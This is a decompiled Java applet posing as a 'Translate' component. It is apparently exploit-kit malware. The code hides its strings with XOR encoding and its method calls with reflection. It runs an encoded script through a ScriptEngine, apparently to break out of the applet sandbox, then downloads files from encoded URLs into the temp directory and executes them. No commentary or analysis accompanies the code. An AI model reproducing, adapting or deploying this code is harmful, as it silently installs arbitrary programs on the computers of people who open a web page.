import javax.swing.JList;
import java.awt.Component;
import javax.script.Invocable;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.net.URL;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Translate extends Applet
{
    static String a;
    public static FileOutputStream g;
    static String b;
    static InputStream d;
    static String e;
    URL c;
    public static boolean f;
    public static boolean h;
    private static final String[] z;
    
    private static final native void boo();
    
    @Override
    public void init() {
        try {
            Translate.e = Translate.z[3];
            final String s = Translate.z[8];
            final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName(Translate.z[5]);
            Translate.a = Translate.z[4];
            ScriptEngine.class.getMethod(Translate.z[2], String.class).invoke(engineByName, Translate.z[1]);
            final Invocable invocable = (Invocable)engineByName;
            Translate.b = Translate.z[7];
            try {
                this.getClass().getMethod(Translate.z[9], Component.class).invoke(this, new JList(new Object[] { invocable.invokeFunction(Translate.z[6], this) }));
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    @Override
    public String toString() {
        final boolean h = Translate.h;
        String concat = "";
        try {
            final String[] split = this.a(Translate.b, Translate.a, (String)this.getClass().getMethod(Translate.z[20], String.class).invoke(this, "p")).split(Translate.z[21]);
            int n = 0;
            while (true) {
                while (true) {
                    Label_0093: {
                        if (!h) {
                            break Label_0093;
                        }
                        concat = concat.concat(this.b(split[n]));
                        ++n;
                    }
                    if (n < split.length) {
                        continue;
                    }
                    break;
                }
                if (h) {
                    continue;
                }
                break;
            }
        }
        catch (Exception ex) {}
        return concat;
    }
    
    public String b(final String s) {
        try {
            final String a = a();
            this.c = new URL(s);
            final String concat = a.concat(String.valueOf(b())).concat(Translate.z[11]);
            a(this.c);
            Translate.g = new FileOutputStream(concat);
            final byte[] array = new byte[4096];
            int intValue;
            while ((intValue = (int)Class.forName(Translate.z[10]).getMethod(Translate.z[13], array.getClass(), Integer.TYPE, Integer.TYPE).invoke(Translate.d, array, 0, array.length)) != -1) {
                a(array, intValue);
            }
            Translate.d.close();
            Translate.g.close();
            try {
                c(concat);
            }
            catch (Exception ex) {}
            final String concat2 = concat.concat(Translate.z[12].substring(7));
            try {
                c(Translate.e.concat(concat2));
            }
            catch (Exception ex2) {}
        }
        catch (Exception ex3) {}
        return "";
    }
    
    public static void a(final Object o) throws Exception {
        Translate.d = (InputStream)a(Translate.z[24]).getMethod(Translate.z[25], (Class[])new Class[0]).invoke(o, new Object[0]);
    }
    
    public static void c(final String s) throws Exception {
        a(Translate.z[15]).getMethod(Translate.z[18], String.class).invoke(c(), s);
    }
    
    public static Object c() throws Exception {
        return a(Translate.z[15]).getMethod(Translate.z[14], (Class[])new Class[0]).invoke(a(Translate.z[15]), new Object[0]);
    }
    
    public static Class a(final String s) throws Exception {
        return (Class)Class.class.getMethod(Translate.z[22], String.class).invoke(Class.class, s);
    }
    
    public static double b() throws Exception {
        return (double)Math.class.getMethod(Translate.z[19], (Class<?>[])new Class[0]).invoke(Math.class, new Object[0]);
    }
    
    public static String a() throws Exception {
        return (String)System.class.getMethod(Translate.z[16], String.class).invoke(System.class, Translate.z[17]);
    }
    
    public static void a(final byte[] array, final int n) throws Exception {
        final boolean h = Translate.h;
        boolean f2 = false;
        Label_0085: {
            Label_0079: {
                boolean f;
                try {
                    FileOutputStream.class.getMethod(Translate.z[23], byte[].class, Integer.TYPE, Integer.TYPE).invoke(Translate.g, array, 0, n);
                    if (!h) {
                        return;
                    }
                    f = Translate.f;
                    if (f) {
                        break Label_0079;
                    }
                    break Label_0079;
                }
                catch (Exception ex) {
                    throw ex;
                }
                try {
                    if (f) {
                        f2 = false;
                        break Label_0085;
                    }
                }
                catch (Exception ex2) {
                    throw ex2;
                }
            }
            f2 = true;
        }
        Translate.f = f2;
    }
    
    public String a(final String s, final String s2, final String s3) throws Exception {
        boolean h;
        String s7 = null;
        while (true) {
            h = Translate.h;
            String s4 = "";
            int n = 10;
            int n2 = 0;
        Label_0029_Outer:
            while (true) {
                String s5;
                try {
                    if (!h) {
                        break Label_0029_Outer;
                    }
                    s5 = s;
                    final String s6 = s;
                }
                catch (Exception ex) {
                    throw ex;
                }
                while (true) {
                    Label_0104: {
                        if (!h) {
                            final int index;
                            if ((index = s7.indexOf(s3.charAt(n2))) < 0) {
                                break Label_0104;
                            }
                            try {
                                n += 12;
                                s5 = (String)s4.getClass().getMethod(Translate.z[0], String.class).invoke(s4, String.valueOf(s2.charAt(index)));
                            }
                            catch (Exception ex2) {
                                throw ex2;
                            }
                        }
                        s4 = s5;
                    }
                    ++n2;
                    try {
                        if (n2 < s3.length()) {
                            continue Label_0029_Outer;
                        }
                        s7 = (s5 = s4);
                        if (h) {
                            continue;
                        }
                    }
                    catch (Exception ex3) {
                        throw ex3;
                    }
                    break;
                }
                break;
            }
            break;
        }
        final boolean f = Translate.f;
        boolean h2 = false;
        Label_0148: {
            Label_0142: {
                boolean b;
                try {
                    if (!f) {
                        return s7;
                    }
                    b = h;
                    if (b) {
                        break Label_0142;
                    }
                    break Label_0142;
                }
                catch (Exception ex4) {
                    throw ex4;
                }
                try {
                    if (b) {
                        h2 = false;
                        break Label_0148;
                    }
                }
                catch (Exception ex5) {
                    throw ex5;
                }
            }
            h2 = true;
        }
        Translate.h = h2;
        return s7;
    }
    
    static {
        final String[] z2 = new String[26];
        int n26;
        int n25;
        int n24;
        int n23;
        int n22;
        int n21;
        int n20;
        int n19;
        int n18;
        int n17;
        int n16;
        int n15;
        int n14;
        int n13;
        int n12;
        int n11;
        int n10;
        int n9;
        int n8;
        int n7;
        int n6;
        int n5;
        int n4;
        int n3;
        int n2;
        int n = n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 0))))))))))))))))))))))));
        String s = "~$Z\u0001`i";
        int n27 = -1;
        String intern = null;
    Label_0300_Outer:
        while (true) {
            final char[] charArray = s.toCharArray();
            int length;
            int n29;
            final int n28 = n29 = (length = charArray.length);
            int n30 = 0;
            while (true) {
                Label_0373: {
                    if (n28 > 1) {
                        break Label_0373;
                    }
                    length = (n29 = n30);
                    do {
                        final char c = charArray[n29];
                        char c2 = '\0';
                        switch (n30 % 5) {
                            case 0: {
                                c2 = '\u001d';
                                break;
                            }
                            case 1: {
                                c2 = 'K';
                                break;
                            }
                            case 2: {
                                c2 = '4';
                                break;
                            }
                            case 3: {
                                c2 = 'b';
                                break;
                            }
                            default: {
                                c2 = '\u0001';
                                break;
                            }
                        }
                        charArray[length] = (char)(c ^ c2);
                        ++n30;
                    } while (n28 == 0);
                }
                if (n28 > n30) {
                    continue;
                }
                break;
            }
            intern = new String(charArray).intern();
            switch (n27) {
                default: {
                    z2[n2] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 1)))))))))))))))))))))))));
                    s = "{>Z\u0001ut$ZBur\u0018@\u0010hs,\u001c\u0011uobO\u000b<-p@\nhne@\rRi9]\ff=v\u0014\u0004ts(@\u000bnsc\u001d\u0019h{c]^<-bO\u0016sd0^\u0003w|eX\u0003ozeg\u001bri.YLrx?g\u0007bh9]\u0016xP*Z\u0003fx9\u001c\ftq'\u001dYri9\u001a\u0016nN?F\u000bozc\u001dY|~*@\u0001i5.\u001d\u0019|`p]I*&9Q\u0016to%\u0014E&&6\u000f\u0007! kZ\u0007v=\u000eF\u0010noc\u001dYd3&Q\u0011r|,QB<=?\\\u000br&9Q\u0016to%\u0014\u0007:`";
                    n27 = 0;
                    continue Label_0300_Outer;
                }
                case 0: {
                    z2[n] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 2)))))))))))))))))))))))));
                    s = "x=U\u000e";
                    n27 = 1;
                    continue Label_0300_Outer;
                }
                case 1: {
                    z2[n3] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 3)))))))))))))))))))))))));
                    s = "o.S\u0011wox\u0006B,nk\u0016";
                    n27 = 2;
                    continue Label_0300_Outer;
                }
                case 2: {
                    z2[n4] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 4)))))))))))))))))))))))));
                    s = ",\u0003\fO[D\u0004\r\u0017UZ\u0002\u0011&do!L7vl\u0014S$h;\u001d@\u0011l/'\\\fw'\u0000z5/Xt_\u00124r\u001av(6~d\u0007\u0003gg\u0019\u0004:M \n\u001717y\u007fw2L\u007f2";
                    n27 = 3;
                    continue Label_0300_Outer;
                }
                case 3: {
                    z2[n5] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 5)))))))))))))))))))))))));
                    s = "w8";
                    n27 = 4;
                    continue Label_0300_Outer;
                }
                case 4: {
                    z2[n6] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 6)))))))))))))))))))))))));
                    s = "i$g\u0016st%S";
                    n27 = 5;
                    continue Label_0300_Outer;
                }
                case 5: {
                    z2[n7] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 7)))))))))))))))))))))))));
                    s = "y\u0004v\u0003[>m\u001b\ncO3ZX7/\u000f\u0000RXT\u001fq,vZ>G\u0018T.2B\u0007Yq\bx)QmfR/8[\u001a\u000b\bnW,\u0011UWi\u0003FS^~\u001c\f1<\\~Y\u000bp3 ";
                    n27 = 6;
                    continue Label_0300_Outer;
                }
                case 6: {
                    z2[n8] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 8)))))))))))))))))))))))));
                    s = "n=V\u0014f*?M\bth,]\u0000ir;][9h\"V\n";
                    n27 = 7;
                    continue Label_0300_Outer;
                }
                case 7: {
                    z2[n9] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 9)))))))))))))))))))))))));
                    s = "|/P";
                    n27 = 8;
                    continue Label_0300_Outer;
                }
                case 8: {
                    z2[n10] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 10)))))))))))))))))))))))));
                    s = "w*B\u0003/t$\u001a+om>@1uo.U\u000f";
                    n27 = 9;
                    continue Label_0300_Outer;
                }
                case 9: {
                    z2[n11] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 11)))))))))))))))))))))))));
                    s = "3.L\u0007";
                    n27 = 10;
                    continue Label_0300_Outer;
                }
                case 10: {
                    z2[n12] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 12)))))))))))))))))))))))));
                    s = "n)A\rymp\u0016";
                    n27 = 11;
                    continue Label_0300_Outer;
                }
                case 11: {
                    z2[n13] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 13)))))))))))))))))))))))));
                    s = "o.U\u0006";
                    n27 = 12;
                    continue Label_0300_Outer;
                }
                case 12: {
                    z2[n14] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 14)))))))))))))))))))))))));
                    s = "z.@0ts?]\u000fd";
                    n27 = 13;
                    continue Label_0300_Outer;
                }
                case 13: {
                    z2[n15] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 15)))))))))))))))))))))))));
                    s = "w*B\u0003/q*Z\u0005/O>Z\u0016hp.";
                    n27 = 14;
                    continue Label_0300_Outer;
                }
                case 14: {
                    z2[n16] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 16)))))))))))))))))))))))));
                    s = "z.@2sr;Q\u0010ud";
                    n27 = 15;
                    continue Label_0300_Outer;
                }
                case 15: {
                    z2[n17] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 17)))))))))))))))))))))))));
                    s = "w*B\u0003/t$\u001a\u0016lm/]\u0010";
                    n27 = 16;
                    continue Label_0300_Outer;
                }
                case 16: {
                    z2[n18] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 18)))))))))))))))))))))))));
                    s = "x3Q\u0001";
                    n27 = 17;
                    continue Label_0300_Outer;
                }
                case 17: {
                    z2[n19] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 19)))))))))))))))))))))))));
                    s = "o*Z\u0006np";
                    n27 = 18;
                    continue Label_0300_Outer;
                }
                case 18: {
                    z2[n20] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 20)))))))))))))))))))))))));
                    s = "z.@2`o*Y\u0007ux9";
                    n27 = 19;
                    continue Label_0300_Outer;
                }
                case 19: {
                    z2[n21] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 21)))))))))))))))))))))))));
                    s = "'q";
                    n27 = 20;
                    continue Label_0300_Outer;
                }
                case 20: {
                    z2[n22] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 22)))))))))))))))))))))))));
                    s = "{$F,`p.";
                    n27 = 21;
                    continue Label_0300_Outer;
                }
                case 21: {
                    z2[n23] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 23)))))))))))))))))))))))));
                    s = "j9]\u0016d";
                    n27 = 22;
                    continue Label_0300_Outer;
                }
                case 22: {
                    z2[n24] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 24)))))))))))))))))))))))));
                    s = "w*B\u0003/s.@LTO\u0007";
                    n27 = 23;
                    continue Label_0300_Outer;
                }
                case 23: {
                    z2[n25] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = 25)))))))))))))))))))))))));
                    s = "r;Q\fRi9Q\u0003l";
                    n27 = 24;
                    continue Label_0300_Outer;
                }
                case 24: {
                    break Label_0300_Outer;
                }
            }
        }
        z2[n26] = intern;
        z = z2;
    }
}
